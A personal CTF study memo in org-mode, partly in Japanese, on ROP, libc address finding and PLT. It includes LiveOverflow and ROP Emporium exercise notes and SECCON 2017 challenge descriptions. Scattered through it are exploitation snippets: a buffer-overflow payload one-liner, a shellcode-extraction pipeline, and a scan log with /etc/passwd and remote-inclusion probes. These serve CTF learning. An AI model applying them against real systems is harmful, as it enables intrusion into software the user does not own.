#+title: CTF study memo

* general concepts
** ROP(return oriented programming)

attack methods in the presense of non-executable memory (W xor X technique) and code signing
run machine instruction sequences that are already in the machine's memory, called "gadgets"

#+BEGIN_QUOTE
The rise of 64-bit x86 processors brought with it a change to the subroutine calling convention that required the first argument to a function to be passed in a register instead of on the stack. This meant that an attacker could no longer set up a library function call with desired arguments just by manipulating the call stack via a buffer overrun exploit. 
#+END_QUOTE

#+BEGIN_QUOTE
ret命令で終わる命令列の先頭へのジャンプを繰り返すことで、任意の命令列を実行させることができる
#+END_QUOTE

わかりやすい説明
https://www.goto.info.waseda.ac.jp/~kiire/bin/rop.php

** PLT(procedure linkage table)
https://eli.thegreenplace.net/2011/11/03/position-independent-code-pic-in-shared-libraries/

#+BEGIN_QUOTE
when the linker creates a shared library, it doesn't know in advance where it might be loaded. This creates a problem for the data and code references within the library, which should be somehow made to point to the correct memory locations.
#+END_QUOTE


** non-executable memory
** code signing
** gadgets
コードをインジェクとするのではなく、最初から(攻撃前から)存在する攻撃に利用できるインストラクション。攻撃性のないインストラクションを組み合わせて攻撃する。
** Executable space protection
** NX bit
** offset2lib attack
https://cybersecurity.upv.es/attacks/offset2lib/offset2lib.html

#+BEGIN_QUOTE
The goal of the attack is to obtain an address which belongs to the application code.
#+END_QUOTE

* liveoverflow
** exploit-exercises
*** stack6
https://www.youtube.com/watch?v=m17mV24TgwY

__builtin_retiurn_address
tells the current return addres from the stackf

returnアドレスが0xbfで始まっているものはダメ
#+BEGIN_SRC c
ret = __builtin_return_address(0);

  if((ret & 0xbf000000) == 0xbf000000) {
      printf("bzzzt (%p)\n", ret);
      _exit(1);
  }
#+END_SRC


*** how to find "/bin/sh" in libc

#+BEGIN_SRC shell-script
strings -a -t x /lib/i386-linux-gnu/libc-2.23.so |grep "/bin/sh"
#+END_SRC
then, you get the offset to the command

#+BEGIN_SRC shell-script
gef➤  info proc map
process 10659         
Mapped address spaces:
                                             
        Start Addr   End Addr       Size     Offset objfile
         0x8048000  0x8049000     0x1000        0x0 /home/gsx/Projects/ctf-trials/liveoverflow/stack6/stack6
         0x8049000  0x804a000     0x1000        0x0 /home/gsx/Projects/ctf-trials/liveoverflow/stack6/stack6
         0x804a000  0x806b000    0x21000        0x0 [heap]                                                           
        0xb7e08000 0xb7fb8000   0x1b0000        0x0 /lib/i386-linux-gnu/libc-2.23.so                                  
        0xb7fb8000 0xb7fba000     0x2000   0x1af000 /lib/i386-linux-gnu/libc-2.23.so                                  
        0xb7fba000 0xb7fbb000     0x1000   0x1b1000 /lib/i386-linux-gnu/libc-2.23.so                                  
        0xb7fbb000 0xb7fbe000     0x3000        0x0                                                                   
        0xb7fd6000 0xb7fd8000     0x2000        0x0                                                                   
        0xb7fd8000 0xb7fda000     0x2000        0x0 [vvar]                                                            
        0xb7fda000 0xb7fdb000     0x1000        0x0 [vdso]                                                            
        0xb7fdb000 0xb7ffd000    0x22000        0x0 /lib/i386-linux-gnu/ld-2.23.so                                    
        0xb7ffd000 0xb7ffe000     0x1000        0x0                                                                   
        0xb7ffe000 0xb7fff000     0x1000    0x22000 /lib/i386-linux-gnu/ld-2.23.so                                    
        0xb7fff000 0xb8000000     0x1000    0x23000 /lib/i386-linux-gnu/ld-2.23.so                                    
        0xbffdf000 0xc0000000    0x21000        0x0 [stack]                                                           
gef➤  find 0xb7e08000, +99999999, "/bin/sh"                                                                           
0xb7f639ab                                                                                                            
warning: Unable to access 16000 bytes of target memory at 0xb7fbd733, halting search.                                 
1 pattern found.                                                                                                      
gef➤  find 0xb7e08000, +9999999, "/bin/sh"                                                                            
0xb7f639ab                                                                                                            
warning: Unable to access 16000 bytes of target memory at 0xb7fbd733, halting search.                                 
1 pattern found.                                                                                                      
gef➤  x/s 0xb7e08000+15b9abs                                                                                          
Invalid number "15b9abs".                                                                                             
gef➤  x/s 0xb7e08000+0x15b9abs                                                                                        
Invalid number "0x15b9abs".                                                                                           
gef➤  x/s 0xb7e08000+0x15b9ab                                                                                         
0xb7f639ab:     "/bin/sh"                                                                                             
gef➤
#+END_SRC

to run exploit
#+BEGIN_SRC shell-script
(python exploit2.py; cat) | ./stack6
#+END_SRC

** teufel(pwnable 200)							:rop:
https://www.youtube.com/watch?v=wDosab_Y4Hs

#+BEGIN_SRC shell-script
(ctf) gsx@gsx-virtual-machine:~/Projects/ctf-trials/ROP/teufel$ pmap `pidof teufel`
80172:   ./teufel
0000000000400000      4K r-x-- teufel
0000000000600000      4K r---- teufel
0000000000caf000    132K rw---   [ anon ]
00007fd311e6c000   1880K r-x-- libc-2.26.so
00007fd312042000   2048K ----- libc-2.26.so
00007fd312242000     16K r---- libc-2.26.so
00007fd312246000      8K rw--- libc-2.26.so
00007fd312248000     16K rw---   [ anon ]
00007fd31224c000    156K r-x-- ld-2.26.so
00007fd312457000     12K rw---   [ anon ]
00007fd31246d000      4K -----   [ anon ]
00007fd31246e000      4K rw---   [ anon ]
00007fd31246f000      4K -----   [ anon ]
00007fd312470000     12K rw---   [ anon ]
00007fd312473000      4K r---- ld-2.26.so
00007fd312474000      4K rw--- ld-2.26.so
00007fd312475000      4K rw---   [ anon ]
00007ffc1c157000    132K rw---   [ stack ]
00007ffc1c1a3000     12K r----   [ anon ]
00007ffc1c1a6000      8K r-x--   [ anon ]
ffffffffff600000      4K r-x--   [ anon ]
 total             4468K
(ctf) gsx@gsx-virtual-machine:~/Projects/ctf-trials/ROP/teufel$
#+END_SRC

以下部分で readable and writable area in the middle and you have to guard pages with no protection around it
#+BEGIN_SRC shell-script
00007fd31246d000      4K -----   [ anon ]
00007fd31246e000      4K rw---   [ anon ]
00007fd31246f000      4K -----   [ anon ]
#+END_SRC

** Internetwache CTF 2016
https://www.youtube.com/watch?v=bAlF22mIYNk
https://github.com/internetwache/Internetwache-CTF-2016

public key and private key are exponent and modulus of mathematical algorithms

factordb: database of factorization
http://www.factordb.com/

#+BEGIN_SRC shell-script
$ openssl rsa -pubin -inform PEM -text -noout -in bob.pub
Public-Key: (228 bit)
Modulus:
    0d:56:4b:97:8f:9d:23:35:04:95:8e:ed:8b:74:43:
    73:28:1e:d1:41:8b:29:f1:ec:fa:80:93:d8:cf
Exponent: 65537 (0x10001)
$
#+END_SRC

** rhme2 (crypto 200)					    :crypto:hardware:

https://www.youtube.com/watch?v=sYCzu04ftaY


* ROP Emporium
https://ropemporium.com/

** callme32
#+BEGIN_QUOTE
it's important you understand what resides at the addresses reported to you by commands like rabin2 -i <binary> and rabin2 -R <binary>
#+END_QUOTE

#+BEGIN_QUOTE
gsx@gsx-virtual-machine:~/Projects/ctf-trials/ROP/ROPEmporium/callme32$ rabin2 -i callme32
[Imports]
ordinal=001 plt=0x00000000 bind=WEAK type=NOTYPE name=_ITM_deregisterTMCloneTable
ordinal=002 plt=0x08048590 bind=GLOBAL type=FUNC name=printf
ordinal=003 plt=0x080485a0 bind=GLOBAL type=FUNC name=fgets
ordinal=004 plt=0x080485b0 bind=GLOBAL type=FUNC name=callme_three
ordinal=005 plt=0x080485c0 bind=GLOBAL type=FUNC name=callme_one
ordinal=006 plt=0x080485d0 bind=GLOBAL type=FUNC name=puts
ordinal=007 plt=0x00000000 bind=WEAK type=NOTYPE name=__gmon_start__
ordinal=008 plt=0x080485e0 bind=GLOBAL type=FUNC name=exit
ordinal=009 plt=0x080485f0 bind=GLOBAL type=FUNC name=__libc_start_main
ordinal=010 plt=0x08048600 bind=GLOBAL type=FUNC name=setvbuf
ordinal=011 plt=0x08048610 bind=GLOBAL type=FUNC name=memset
ordinal=012 plt=0x08048620 bind=GLOBAL type=FUNC name=callme_two
ordinal=013 plt=0x00000000 bind=WEAK type=NOTYPE name=_Jv_RegisterClasses
ordinal=014 plt=0x00000000 bind=WEAK type=NOTYPE name=_ITM_registerTMCloneTable

14 imports
gsx@gsx-virtual-machine:~/Projects/ctf-trials/ROP/ROPEmporium/callme32$ rabin2 -R ./callme32
[Relocations]
vaddr=0x08049ffc paddr=0x00000ffc type=SET_32 __gmon_start__
vaddr=0x0804a040 paddr=0x00001040 type=SET_64
vaddr=0x0804a060 paddr=0x00001060 type=SET_64
vaddr=0x0804a064 paddr=0x00001064 type=SET_64
vaddr=0x0804a00c paddr=0x0000100c type=SET_32 printf
vaddr=0x0804a010 paddr=0x00001010 type=SET_32 fgets
vaddr=0x0804a014 paddr=0x00001014 type=SET_32 callme_three
vaddr=0x0804a018 paddr=0x00001018 type=SET_32 callme_one
vaddr=0x0804a01c paddr=0x0000101c type=SET_32 puts
vaddr=0x0804a020 paddr=0x00001020 type=SET_32 exit
vaddr=0x0804a024 paddr=0x00001024 type=SET_32 __libc_start_main
vaddr=0x0804a028 paddr=0x00001028 type=SET_32 setvbuf
vaddr=0x0804a02c paddr=0x0000102c type=SET_32 memset
vaddr=0x0804a030 paddr=0x00001030 type=SET_32 callme_two

14 relocations
gsx@gsx-virtual-machine:~/Projects/ctf-trials/ROP/ROPEmporium/callme32$
#+END_QUOTE

dataセクション開始
0x0804a034

** callme

** tools
https://github.com/sashs/Ropper
https://github.com/JonathanSalwan/ROPgadget
#+BEGIN_SRC shell-script
pip install capstone==3.0.5rc2
pip install ropgadget
#+END_SRC

*** pwntools
https://github.com/Gallopsled/pwntools

#+BEGIN_SRC shell-script
pwn template ./program --host localhost --port 1234
#+END_SRC


*** oneliner(python)
#+BEGIN_SRC shell-script
(python -c 'import struct; print "A"*28 + struct.pack("I", 0x080484cb)'; cat -) | ./binary
#+END_SRC

* SECCON2017
** Vigenere3d
----- Vigenere3d.py
import sys
def _l(idx, s):
    return s[idx:] + s[:idx]
def main(p, k1, k2):
    s = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789abcdefghijklmnopqrstuvwxyz_{}"
    t = [[_l((i+j) % len(s), s) for j in range(len(s))] for i in range(len(s))]
    i1 = 0
    i2 = 0
    c = ""
    for a in p:
        c += t[s.find(a)][s.find(k1[i1])][s.find(k2[i2])]
        i1 = (i1 + 1) % len(k1)
        i2 = (i2 + 1) % len(k2)
    return c
print main(sys.argv[1], sys.argv[2], sys.argv[2][::-1])
-----
$ python Vigenere3d.py SECCON{**************************} **************
POR4dnyTLHBfwbxAAZhe}}ocZR3Cxcftw9



$ python Vigenere3d.py SECCON{AAAAAAAAAAAAAAAAAAAAAAAAAA} BBBBBBBBBBBBBB
$ python Vigenere3d.py SECCON{AAAAAAAAAAAAAAAAAAAAAAAAAA} 12345678901234

#+BEGIN_SRC shell-script

#+END_SRC

** Run me!
-----  RunMe.py
import sys
sys.setrecursionlimit(99999)
def f(n):
    return n if n < 2 else f(n-2) + f(n-1)
print "SECCON{" + str(f(11011))[:32] + "}"
-----

** putchar music
This one line of C program works on Linux Desktop. What is this movie's title? 
Please answer the flag as SECCON{MOVIES_TITLE}, replace all alphabets with capital letters, and spaces with underscores.

main(t,i,j){unsigned char p[]="###<f_YM\204g_YM\204g_Y_H #<f_YM\204g_YM\204g_Y_H #+-?[WKAMYJ/7 #+-?[WKgH #+-?[WKAMYJ/7hk\206\203tk\\YJAfkkk";for(i=0;t=1;i=(i+1)%(sizeof(p)-1)){double x=pow(1.05946309435931,p[i]/6+13);for(j=1+p[i]%6;t++%(8192/j);)putchar(t>>5|(int)(t*x));}}

** Baby Stack
Can you do a traditional stack attack?

Host : baby_stack.pwn.seccon.jp
Port : 15285

*** memo
main.main　という関数が大きく重要そう
   
** Qubic Rube
Please continue to solve Rubic's Cube and read QR code.
http://qubicrube.pwn.seccon.jp:33654/

** hash_burger
"Hash burger" for burger shop management!
Flag is in /home/hash_burger/flag.

Host : hash_burger.pwn.seccon.jp
Port : 9999
hash_burger-af75f859c355b45b0deee710ad4ce0dc6a2db9d7128431e1d380f34defdaad21.zip (pass:seccon2017)
** SHA-1 is dead
http://sha1.pwn.seccon.jp/
Upload two files satisfy following conditions:

file1 != file2
SHA1(file1) == SHA1(file2)
2017kb < sizeof(file1) < 2018kb
2017kb < sizeof(file2) < 2018kb
** Powerful_Shell
Crack me.
powerful_shell.ps1-1fb3af91eafdbebf3b3efa3b84fcc10cfca21ab53db15c98797b500c739b0024
** Election
Today is the vote day.
Who would you like to be chairman?

Host : election.pwn.seccon.jp
Port : 28349
election-9724a8d0a6c9ccb131200ec96752c61c0e6734cd9e1bb7b1958f8c88c0bd78fa.zip(pass:seccon2017)
** qlSRF
The root reply the flag to your mail address if you send a mail that subject is "give me flag" to root.
http://sqlsrf.pwn.seccon.jp/sqlsrf/

** logsearch 

10/Dec/2017:05:13:24 +0900	GET	/etc/passwd/jservdocs/	404
10/Dec/2017:05:13:24 +0900	GET	/etc/passwd/test/jsp/declaration/IntegerOverflow.jsp	404
10/Dec/2017:05:13:24 +0900	HEAD	/icons/2pac.php	404
10/Dec/2017:05:13:24 +0900	GET	/components/com_facileforms/facileforms.frame.php?ff_compath=http://cirt.net/rfiinc.txt?	404
10/Dec/2017:05:13:24 +0900	HEAD	/chris/	404
10/Dec/2017:05:13:24 +0900	HEAD	/20061114/	404
10/Dec/2017:05:13:24 +0900	HEAD	/newsite/	404 
10/Dec/2017:05:13:24 +0900	HEAD	/Fonts/	404
10/Dec/2017:05:13:24 +0900	HEAD	/cgi-bin/firewall_software.php	404
10/Dec/2017:05:13:24 +0900	HEAD	/icons/small/banner_top/	404
10/Dec/2017:05:13:24 +0900	HEAD	/dvd_shrink/	404


10/Dec/2017:05:13:24 +0900	GET	/etc/passwd/doc/rt/overview-summary.html	404
10/Dec/2017:05:13:24 +0900	GET	/etc/passwd/docs/sdb/en/html/index.html	404
10/Dec/2017:05:13:24 +0900	GET	/etc/passwd/test/jsp/buffer1.jsp	404
10/Dec/2017:05:13:24 +0900	GET	/etc/passwd/test/jsp/buffer2.jsp	404
10/Dec/2017:05:13:24 +0900	GET	/etc/passwd/test/jsp/buffer3.jsp	404
10/Dec/2017:05:13:24 +0900	GET	/etc/passwd/test/jsp/buffer4.jsp	404
10/Dec/2017:05:13:24 +0900	GET	/etc/passwd/test/jsp/extends1.jsp	404
10/Dec/2017:05:13:24 +0900	HEAD	/icons/disabilities/	404
10/Dec/2017:05:13:24 +0900	HEAD	/cgi-bin/security-encryption/	404
10/Dec/2017:05:13:24 +0900	HEAD	/55047/	404
10/Dec/2017:05:13:24 +0900	HEAD	/dvd_shrink.php	404
10/Dec/2017:05:13:24 +0900	HEAD	/icons/small/334-latestnews.php	404
10/Dec/2017:05:13:24 +0900	HEAD	/cgi-bin/895/	404
10/Dec/2017:05:13:24 +0900	HEAD	/55018/	404
10/Dec/2017:05:13:24 +0900	HEAD	/icons/digital-photography/	404
10/Dec/2017:05:13:24 +0900	GET	/etc/passwd/test/jsp/extends2.jsp	404
10/Dec/2017:05:13:24 +0900	HEAD	/cgi-bin/Courses/	404

10/Dec/2017:05:13:24 +0900	HEAD	/2005-06/	404
-> ?

10/Dec/2017:05:13:24 +0900	GET	/	200
-> x ?


** Man-in-the-middle on SECP384R1
Steal the conversation between dev0 and dev1.
Host : mitm.pwn.seccon.jp
Port : 8000

sample code for MITM is below.
exploit-5b67f6c7a3a7b84c8e36252773a69e9ce9818f599c63583bde50cce2301f7286.py

** printf machine
Crack me.
printf_machine-05943cfba938e4ab7f52f096e35f6197c9308a6c56c83d75812adebe21671f9a.zip(pass;seccon2017)

** Ps and Qs
Decrypt it.
update: we fixed the flag, please try to submit again.

psqs1-0dd2921c9fbdb738e51639801f64164dd144d0771011a1dc3d55da6fbcb0fa02.zip (pass:seccon2017)

** vm_no_fun
You're waiting for a shell...
A shell that will take you far away...

Host : vm_no_fun.pwn.seccon.jp
Port : 30203
vm_no_fun-a2e1004a46f52e5628b10220af52f2f0d2cdd0ef14ef9b09860dd0de84a797fa.zip

** Theory of Relativity
Part two(The Interpreter) may be harder than this one.

Here is a bytecode interpreter. It executes your program and shows the output. In fact, I prepared this to run an event named "slowest program wins!" A program with longest elapsed time wins a gift. That's all.

There's a timeout (14s maybe?). However, if your program executes longer than **100 seconds**, you win the flag!

For your information, the server is Ubuntu 16.04.3 with node.js 8.9.1.

http://relativity.pwn.seccon.jp:5000/
relativity_and_interpreter-bbea97c5160f8fd11b084c5736c8db0c93653fd0028c01d3372c1cd9ecab6455.tgz
** The Interpreter
Part one(Theory of Relativity) seems easier, but you can try these independently.

It might be a cliche for the second part, but here it is: read the /flag.txt! For your information, the server is Ubuntu 16.04.3 with node.js 8.9.1.

http://interpreter.pwn.seccon.jp:5000/
relativity_and_interpreter-bbea97c5160f8fd11b084c5736c8db0c93653fd0028c01d3372c1cd9ecab6455.tgz
** video_player
Is my video player good enough??

Host : video_player.pwn.seccon.jp
Port : 7777
video_player-45f734c492c2b9f9a0f8d7e6ffe4656a11e69270c05eabfc215843b65dd452cb.zip (pass:seccon2017)
** Remote debugging of a micro computer

Connect to the server and read "word.txt" on current directory.
$ echo '$g#67+' | nc micro.pwn.seccon.jp 10000

The server is running on GDB simulator with special patches.
Long time connection will be disconnected automatically. (in several minutes)
Short interval requests will be also ignored. (in several seconds)

---- information ----
Reference:
*** About SOP
https://www.slideshare.net/kozossakai/possibility-of-arbitrary-code-execution-by-steporiented-programming

*** Assembly samples for many architectures
http://kozos.jp/books/asm/cross-gcc494-v1.0.zip

See the assembly samples.
$ unzip cross-gcc494-v1.0.zip
$ cd cross-gcc494/sample
$ ls *.d

See the sample programs running on GDB simulator.
$ cd cross-gcc494/exec
$ ls *.d

*** Files of the old server using SOP to solve it
(at SECCON2016 final competition)

- Information for the server
http://kozos.jp/seccon/2016/final/gdb-server/index.html

- Files of the server
　http://kozos.jp/seccon/2016/final/gdb-server/server.zip

- Files for answer
http://kozos.jp/seccon/2016/final/gdb-server/answer.zip
** Simon and Speck Block Ciphers
https://eprint.iacr.org/2013/404.pdf
Simon_96_64, ECB, key="SECCON{xxxx}", plain=0x6d564d37426e6e71, cipher=0xbb5d12ba422834b5
** z80
Reverse it.
BuggyCPUBoard-82e40efd036ae8e87e149de07e6b99f5e01e389a537bf1d630b5af84d8f2b10a.ino
Pictures.tar.gz
** Online candy store
I have opened an online candy store.

Host : lazenca0x0.pwn.seccon.jp
Port : 9999
Lazenca.0x0-9374845c01384f5fc9efdce81437697499640db78523509906f315a1bed5cb3d.zip (pass:seccon2017)
** Secure KeyManager
I have developed a very very secure key manager!
The key should never leak.
Have a secure day :)

Host : secure_keymanager.pwn.seccon.jp
Port : 47225
secure_keymanager-f9d02e8a1149ff866cad10f001e8f23803bcac3c42ed7ffdcbe50da40e8afd12.zip(pass:seccon2017)
** broadcast
Host : broadcast.pwn.seccon.jp
Port : 8888

My company developed broadcast protocol for our private customers to announce news for each other.
** Very smooth
Decrypt index.html from PCAP.
Please, submit the flag in the format: "SECCON{" + Answer + "}"
*** Answer is written in index.html
very_smooth_36c055008b945516b9c17e2ecce1c582c184b57c2945bbffba20372a8f9a3449.zip
** automatic_door
Get shell, and execute /flag_x
http://automatic_door.pwn.seccon.jp/0b503d0caf712352fc200bc5332c4f95/
* misc. commands and tools
** shell script

サーバでバイナリの待ち受け
#+BEGIN_SRC shell-script
socat TCP-LISTEN:1234,reuseaddr,fork EXEC:./callme
#+END_SRC

mainから次の空行までのみ表示する
#+BEGIN_SRC shell-script
objdump -M intel -d a.out | sed -n '/<main>:/,/^$/p'
#+END_SRC

アセンブリからshellcodeを生成
#+BEGIN_SRC shell-script
$ objdump -M intel -d a.out | grep '^ ' | cut -f2 | perl -pe 's/(\w{2})\s+/\\x\1/g'
#+END_SRC


* system calls
** x86
https://blog.packagecloud.io/eng/2016/04/05/the-definitive-guide-to-linux-system-calls/

